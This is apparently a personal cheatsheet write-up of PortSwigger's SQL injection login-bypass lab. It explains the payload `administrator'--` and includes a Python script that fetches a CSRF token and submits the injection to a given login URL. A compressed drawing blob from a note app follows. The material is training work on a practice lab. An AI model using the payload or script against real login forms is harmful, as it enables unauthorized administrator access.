---
title: "Portswigger SQL Injection Lab 2"
description: "SQL injection vulnerability allowing login bypass"
date: 2025-05-31T12:17:20+05:45
cheatsheet_categories: ["Labs"]
cheatsheet_tags: ["error based sql injection", "pentesting", "sql injection", "portswigger"]
folder: "sqlinjection"
draft: false
weight: 1
---

## Lab: [](https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-subverting-application-logic/sql-injection/lab-login-bypass)

> This lab contains a SQL injection vulnerability in the login function.
	To solve the lab, perform a SQL injection attack that logs in to the application as the `administrator` user.

---
### Finding SQLI
Trying SQL characters, here `'` to check if the server is vulnerable to SQLI
Using burp-repeater to send `administrator'` as username gives -> **Internal Server Error** -> SQLi existence confirmed
![[sqli-lab2-burp-repeater.png]]

### Guessing Backend Query
```sql
	SELECT user from users WHERE username='admin' and password='admin'
```
### Attacking
Using the SQLi `administrator'-- ` results in the following query:
```sql
	SELECT user from users WHERE username='administrator'-- and password='admin'
```
If the administrator user exists, we will be authenticated as the password is skipped using the injection

 **Used payload->**  `administrator'--`  
---
# Pythonizing for Automating 
```python
import sys
import requests
import urllib3
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'} 

def get_csrf_token(sess,url):
    req=sess.get(url, verify=False, proxies=proxies)
    token=BeautifulSoup(req.text, 'html.parser')
    csrf=token.find("input")['value']
    print(f"CSRF: {csrf}")
    return csrf

def exploit_sqli(sess, url,payload):
    csrf=get_csrf_token(sess,url)
    form_data={
        "csrf" : csrf,
        "username" : payload,
        "password" : "anything"
    }
    res = sess.post(url, data=form_data, verify=False, proxies=proxies)
    if "Update email" in res.text:
        return True
    else:
        return False
    
if __name__=="__main__":
    try:
        url= sys.argv[1].strip()
        payload=sys.argv[2].strip()
    except IndexError:
        print(f"[ - ] Usage: {sys.argv[0]} <URL> <Payload>")
    
    sess = requests.Session()
    if exploit_sqli(sess, url, payload):
        print("Successful")
    else:
        print("Unsuccessful")
```




%%
# Excalidraw Data
## Text Elements
%%
## Drawing
```compressed-json
N4KAkARALgngDgUwgLgAQQQDwMYEMA2AlgCYBOuA7hADTgQBuCpAzoQPYB2KqATLZMzYBXUtiRoIACyhQ4zZAHoFAc0JRJQgEYA6bGwC2CgF7N6hbEcK4OCtptbErHALRY8RMpWdx8Q1TdIEfARcZgRmBShcZQUebTiADho6IIR9BA4oZm4AbXAwUDAiiBJuCAAxAEYeAFEAGSEAaQAlTShiAC0ASQBrAHkAYQoARyFiADZkoshYRDKAM0CETyp+

YsxuHgB2AGZtLYBWNcgYbmcdhK3jiAoSdW4ABm0Hl8rryQRCZWlH59fr6zKYKPa7MKCkNg9BADNj4NikMoAYkqCBRKKmxU0uGwPWUEKEHGIMLhCIk4OszDguECmQxkHmhHw+AAyrBgRJBB46RAwRCoQB1O6STag8GQhCsmDs9Cc0rXfHfDjhbJoN75SBsKnYNSnVUva544RwLrEFWoHIAXWui1w6RN3A4QiZ10IhKwZVwD25+MJSuYZsdzvVPIQy

24lUOCQALJUdgdKuNrowWOwuGgjsHk6xOAA5ThiTZRqM7ACcWwjfGDhGYABFUlAw2hwUIENdNMJCTVgulMgGnfhrkI4MRcA3iOGtjxYwl41txlGHmrphAiBweg7+9c4TjG6h5gQwtc4GxXVlcuqwHlpkUHscbxerRer9eni9F3ewK/Xg/1Y/l3BAn9ERwlyP9ilYfQnVHBAAAVAOYYDuGbVtg3wUIoBhfR9DUMcYJPWk0GfG8/nfC8v0XX98gAXz

WQpilKCQhB4DpnAAQXGYZWNwHgowAITEGBmQACQADWcGoAH1uVmcR0EWUMVm5DY0C2BJxn2DNl11VBnCjA4EmuW5iHuNByKXYoPi+H5TJI8zIEBaVb2DXlxWJeEkTRVEkDbbFcR9IlYXcslyA4SlqQyKBuQZJlJWlHlYTlZyxQFIURSSvkJTZWT4q5eVhEVZVw2uTVsR1cN9WDQ0hxNM1LWtcg7XHNBAwHKs3WU9BcEqb0O2IP0+yDZcwl3HgHhL

KNxhLA4Sx4pMmGzNNUE04os1TPMOALNAdkqB4EkqGddpdWt613ZC216rs0gigbWuXIcRzHCcpwueMEh2csdi3V112azdULYHcmr3A8UP/fCz0Ip8L0/D8HgfO8iOIt87KR79rwtX8j3g4DarAgRCEgtCGzg5VEKbUgWy3dDMOwmRljw09zxfWy7zMyiiio8A/wgXA4DgVloO4OjoA+dIyiIb5IrWBhCAQCheN8qrCTc0l0EReYNc1jEIGwEQaSgL

oG30VkMpVjyvPRaXddIfXDbSBWcSVgKSTKclQqpfXtet22jfKRkWSyspZXHK29Yiu3jeShBBWM4U0ErYpvfDo2TfFWLsuDr2w8yCPmnyyR+qK/Idezg2jb6LUyr1JzE9LiPyk4KByltRltPMkubeTtIG8yZlCCMWTRtDzuc6NgAVLAoFYiXFpXBB5il4uk9HtIBdIKebbYCgPlwIGWuHn20hqQlWM37eQiBnmz+15hsAhJkRO4VT1MOaXb/v/AAE

1uAmgzi6MNgBghaZgIC2cM1ED5d30HnAkfVCoSH8trPEJA+4Dw3INSAyDnZBVQHRSAvFYSX0RAMEsJCSHlHKNyZoCBlBQVVhARENQaxMKYRQiAECl6l1TlCCuUBUw3WlgBBAZhhDMAAOKkBQf3WS+9i42nSNQt0kiODKGAcuDIuBNDBCBmdYM2AiBwCQhTUGxQOC2lkro5cwgoCrgscYjhxQ7AACsEDYCyMyMxcAACybBiAIGPpo7R3B9z4DCOAG

idBoogTQMATmVEgA
```
%%